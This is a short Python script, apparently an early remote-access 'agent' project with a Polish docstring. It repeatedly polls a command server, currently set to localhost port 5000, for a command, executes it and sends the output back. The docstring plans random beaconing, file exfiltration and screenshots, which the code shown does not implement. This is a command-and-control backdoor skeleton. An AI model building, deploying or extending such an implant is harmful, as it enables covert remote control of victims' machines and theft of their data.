"""
Agent robi:
 - wypytuje co jakiś czas o komendy do wykonania
 - wykonuje komendy
 - zwraca status i stdout/stderr
 - randomowy czas między requestami
 - wysyłanie plików
 - robienie i wysyłanie screenshotów
"""

import time
import subprocess
import requests

SERVER_IP = "127.0.0.1"
PORT = 5000
SERVER_URL = f"http://{SERVER_IP}:{PORT}"

def main():
    while True:
        try:
            result = requests.get(f"{SERVER_URL}/tasks", timeout=10)
            json = result.json()
            command = json.get("cmd", None)
        except:
            continue
        if command:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = process.communicate()
            print(out.decode(), type(out.decode()))
            requests.post(f"{SERVER_URL}/completed", json={"stdout": out.decode(), "stderr": err.decode()}, headers={"Content-Type": "application/json"})
        time.sleep(1)

if __name__ == "__main__":
    main()